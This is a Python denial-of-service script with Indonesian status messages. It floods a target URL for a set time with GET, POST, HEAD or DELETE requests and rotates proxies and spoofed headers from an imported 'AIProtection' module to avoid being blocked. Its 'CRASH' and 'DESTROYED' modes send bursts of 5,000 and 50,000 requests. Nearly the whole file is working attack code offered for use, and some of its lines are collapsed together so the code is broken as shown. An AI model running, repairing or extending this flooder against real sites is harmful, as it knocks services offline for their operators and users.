import requests
import random
import time
import sys
from ai_protection import AIProtection  # Import AI Protection

if len(sys.argv) != 4:  
    print("Usage: python main.py {web target} {time} {methods}")  
    sys.exit(1)

target_url = sys.argv[1] duration = int(sys.argv[2]) methods = sys.argv[3].upper()

ai_defense = AIProtection()  

def attack(target_url, duration, methods): start_time = time.time() while time.time() - start_time < duration: try: proxy = ai_defense.get_proxy() headers = ai_defense.generate_headers(target_url) method = methods if methods in ["GET", "POST", "HEAD", "DELETE", "CRASH", "DESTROYED"] else random.choice(["GET", "POST", "HEAD", "DELETE", "CRASH", "DESTROYED"])

if method == "GET":
            response = requests.get(target_url, headers=headers, proxies=proxy, timeout=3)
        elif method == "POST":
            response = requests.post(target_url, headers=headers, proxies=proxy, data={"data": "random"}, timeout=3)
        elif method == "HEAD":
            response = requests.head(target_url, headers=headers, proxies=proxy, timeout=3)
        elif method == "DELETE":
            response = requests.delete(target_url, headers=headers, proxies=proxy, timeout=3)
        elif method == "CRASH":
            for _ in range(5000):  
                requests.get(target_url, headers=headers, proxies=proxy, timeout=3)
            print("💥 Mode CRASH dijalankan!")
        elif method == "DESTROYED":
            for _ in range(50000):  
                requests.post(target_url, headers=headers, proxies=proxy, data={"attack": "massive"}, timeout=3)
            print("🔥 Mode DESTROYED diaktifkan! Serangan maksimal!")
        
        print(f"🔥 {method} Serangan ke {target_url} | Status: {response.status_code} | Proxy: {proxy}")
        ai_defense.monitor_attack(success=True)
    
    except:
        print("⛔ Proxy mati, mencari proxy lain...")
        ai_defense.monitor_attack(success=False)

print(f"🚀 Memulai serangan ke {target_url} selama {duration} detik dengan metode {methods}...") attack(target_url, duration, methods) print("✅ Serangan selesai!")

